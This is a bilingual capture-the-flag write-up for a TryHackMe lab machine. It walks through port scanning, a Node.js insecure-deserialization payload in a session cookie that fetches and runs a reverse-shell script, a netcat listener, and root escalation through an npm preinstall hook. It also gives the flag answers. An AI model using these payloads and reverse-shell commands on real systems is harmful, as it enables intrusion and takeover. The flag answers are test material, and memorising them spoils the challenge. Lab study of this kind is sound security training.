# Jax sucks alot

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| EASY | CTF (Free) | `jason` | https://tryhackme.com/room/jason | CTF / Máquinas | TryHackMe | Nmap / Burp Suite / Node.js (deserialización insegura) / GTFOBins (npm) | CTF tipo "Horror LLC": pentest completo de una web Node.js vulnerable a deserialización insegura para conseguir una shell y escalar a root vía npm. |

> **Fuente original / Original source:** Writeup de Aakash Modi + kk0128 (Qiita) + BEPb (GitHub)

---

**Contexto:** CTF del catálogo de TryHackMe basado en la empresa "Horror LLC". El servidor frontend no puede ejecutarse en su estado actual, por lo que hay que realizar una prueba de penetración exhaustiva e intentar comprometer la cuenta root. La web guarda la sesión en una cookie base64 vulnerable a deserialización insegura de Node.js, lo que permite obtener una reverse shell y, desde ahí, escalar a root mediante `npm`.

> **ES:** "Somos Horror LLC, nos especializamos en horrores, pero uno de los aspectos más aterradores de nuestra empresa es nuestro servidor frontend. No podemos ejecutar nuestro sitio en su estado actual... Realiza una prueba de penetración exhaustiva e intenta comprometer la cuenta root."
> **EN:** "We are Horror LLC, we specialize in horrors, but one of the most terrifying aspects of our company is our frontend server. We cannot run our site in its current state... Perform a thorough penetration test and try to compromise the root account."

## Solucionario

### Task 1: Escaneo / Scanning

**Explicación:** Se comienza con un escaneo completo de puertos con Nmap (`-p-`, scripts y versiones). El resultado revela dos servicios: SSH en el puerto 22 (OpenSSH sobre Ubuntu) y HTTP en el puerto 80 (Apache), con el título "Horror LLC".

```text
nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt MACHINE_IP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache/2.4.41 (Ubuntu)
|_http-title: Horror LLC
```

### Task 2: Enumeración web / Web Enumeration

**Explicación:** La web "Horror LLC" tiene campos de entrada. Interceptando con Burp Suite, al enviar un email se devuelve una cookie `session` codificada en base64. Al decodificarla se obtiene `{"email":"admin@admin.com"}`. El sitio está construido en Node.js y es vulnerable a **deserialización insegura** (RCE).

```text
echo "eyJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSJ9" | base64 -d
{"email":"admin@admin.com"}
```

El sitio está construido en Node.js y es vulnerable a **deserialización insegura** (RCE).

### Task 3: Explotación / Exploitation

**Explicación:** Se crea un script de reverse shell y se sirve por HTTP (original: *"Crear un script de reverse shell y servirlo:"*) mientras se abre un listener con Netcat. A continuación se construye el payload de deserialización de Node.js (adaptado de opsecx.com) que ejecuta `curl http://YOUR_IP/shell.sh | bash`. Se envía la cookie maliciosa con el payload → reverse shell como `dylan`.

```text
echo -e "sh -i >& /dev/tcp/YOUR_IP/1111 0>&1" > shell.sh
python3 -m http.server 80
```

Listener:

```text
nc -lvnp 1111
```

Payload de deserialización Node.js (adaptado de opsecx.com):

```text
_$$ND_FUNC$$_function (){
 \t require('child_process').exec('curl http://YOUR_IP/shell.sh | bash',
function(error, stdout, stderr) { console.log(stdout) });
 }()
```

Enviar la cookie maliciosa con el payload → reverse shell como `dylan`.

### Task 4: User Flag

**Explicación:** Con la shell como `dylan`, se lee la flag de usuario del sistema.

```text
cat /home/dylan/user.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | user.txt / flag de usuario | `0ba48780dee9f5677a4461f588af217c` |

### Task 5: Escalada de privilegios / Privilege Escalation

**Explicación:** `sudo -l` muestra que `dylan` puede ejecutar `/usr/bin/npm *` como root sin contraseña. Se usa la técnica de GTFOBins con el hook `preinstall` de un `package.json` para lanzar `/bin/sh` como root.

```text
sudo -l
```

```text
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

`npm` se puede ejecutar como root sin contraseña. Usar la técnica de GTFOBins:

```text
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u root /usr/bin/npm -C $TF --unsafe-perm i
```

Esto ejecuta `/bin/sh` como root.

### Task 6: Root Flag

**Explicación:** Con la shell como root se lee la flag raíz del sistema.

```text
cat /root/root.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | root.txt / flag de root | `2cd5a9fd3a0024bfa98d01d69241760e` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | user.txt | `0ba48780dee9f5677a4461f588af217c` |
| 2 | root.txt | `2cd5a9fd3a0024bfa98d01d69241760e` |

---

**Metodología:** 

1. **Recon:** nmap revela SSH (22) y Apache (80).
2. **Web:** la cookie `session` está serializada en base64 → deserialización insegura en Node.js.
3. **Foothold:** payload `_$$ND_FUNC$$_` para RCE → reverse shell como `dylan`.
4. **User flag:** `/home/dylan/user.txt`.
5. **Privesc:** `sudo -l` muestra `npm` con NOPASSWD → GTFOBins `preinstall` → root.
6. **Root flag:** `/root/root.txt`.

### Cadena de ataque / Attack Chain

```text
nmap (-p- -sC -sV) -> Burp Suite (cookie session base64) -> decodificar JSON -> payload _$$ND_FUNC$$_ (deserialización Node.js) -> reverse shell dylan -> sudo -l -> npm GTFOBins (preinstall) -> root -> flags
```

**Learning chain:** nmap -> cookie/sesión -> base64 -> deserialización insegura -> RCE -> reverse shell -> sudo -l -> npm GTFOBins -> root.

**Lección:** *la deserialización insegura en Node.js puede llevar a RCE; revisar siempre `sudo -l` y usar GTFOBins para escalar privilegios.*

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1548.003 (Sudo and Sudo Caching), T1082 (System Information Discovery)

**Fuente:** [TryHackMe - Jax sucks alot](https://tryhackme.com/room/jason)
---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.